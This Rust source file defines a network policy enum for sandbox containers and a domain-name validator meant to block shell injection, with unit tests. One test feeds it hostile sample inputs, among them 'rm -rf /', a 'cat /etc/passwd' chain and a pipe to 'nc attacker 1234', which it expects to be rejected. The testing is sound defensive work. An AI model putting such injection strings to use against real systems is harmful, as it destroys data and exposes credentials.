//! Network policy definitions for sandbox containers.

/// Network access policy for sandbox containers.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum NetworkPolicy {
    /// Allow all network access
    #[default]
    AllowAll,
    /// Only allow specific domains
    Allowlist,
    /// No network access
    Deny,
}

impl std::fmt::Display for NetworkPolicy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::AllowAll => write!(f, "allow-all"),
            Self::Allowlist => write!(f, "allowlist"),
            Self::Deny => write!(f, "deny"),
        }
    }
}

/// Validates a domain name to prevent shell injection.
///
/// Allows only alphanumeric characters, dots, and hyphens.
/// Domain must not start/end with hyphen or dot, and labels
/// must be 1-63 chars with total length <= 253.
///
/// Returns `Some(())` if valid, `None` if invalid.
pub(crate) fn validate_domain(domain: &str) -> Option<()> {
    // Empty or too long
    if domain.is_empty() || domain.len() > 253 {
        return None;
    }

    // Must not start or end with dot or hyphen
    if domain.starts_with('.')
        || domain.ends_with('.')
        || domain.starts_with('-')
        || domain.ends_with('-')
    {
        return None;
    }

    // Check each label
    for label in domain.split('.') {
        // Label must be 1-63 chars
        if label.is_empty() || label.len() > 63 {
            return None;
        }
        // Label must not start or end with hyphen
        if label.starts_with('-') || label.ends_with('-') {
            return None;
        }
        // All chars must be alphanumeric or hyphen
        if !label.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
            return None;
        }
    }

    Some(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_network_policy_display() {
        assert_eq!(format!("{}", NetworkPolicy::AllowAll), "allow-all");
        assert_eq!(format!("{}", NetworkPolicy::Allowlist), "allowlist");
        assert_eq!(format!("{}", NetworkPolicy::Deny), "deny");
    }

    #[test]
    fn test_validate_domain_valid() {
        assert!(validate_domain("github.com").is_some());
        assert!(validate_domain("api.anthropic.com").is_some());
        assert!(validate_domain("registry.npmjs.org").is_some());
        assert!(validate_domain("my-domain.co.uk").is_some());
        assert!(validate_domain("a.b.c.d.e").is_some());
        assert!(validate_domain("x").is_some());
        assert!(validate_domain("123.456").is_some());
        assert!(validate_domain("a-b-c.d-e-f").is_some());
    }

    #[test]
    fn test_validate_domain_shell_injection() {
        // Command injection attempts
        assert!(validate_domain("github.com; rm -rf /").is_none());
        assert!(validate_domain("$(whoami).evil.com").is_none());
        assert!(validate_domain("`id`.evil.com").is_none());
        assert!(validate_domain("evil.com && cat /etc/passwd").is_none());
        assert!(validate_domain("evil.com | nc attacker 1234").is_none());
        assert!(validate_domain("evil.com\nmalicious").is_none());
        assert!(validate_domain("foo'bar.com").is_none());
        assert!(validate_domain("foo\"bar.com").is_none());
        assert!(validate_domain("foo\\bar.com").is_none());
    }

    #[test]
    fn test_validate_domain_invalid_format() {
        assert!(validate_domain("").is_none());
        assert!(validate_domain(".github.com").is_none());
        assert!(validate_domain("github.com.").is_none());
        assert!(validate_domain("-github.com").is_none());
        assert!(validate_domain("github-.com").is_none());
        assert!(validate_domain("github..com").is_none());
        // Label too long (> 63 chars)
        let long_label = "a".repeat(64);
        assert!(validate_domain(&format!("{long_label}.com")).is_none());
        // Total too long (> 253 chars)
        let long_domain = format!(
            "{}.{}.{}.com",
            "a".repeat(60),
            "b".repeat(60),
            "c".repeat(130)
        );
        assert!(validate_domain(&long_domain).is_none());
    }
}
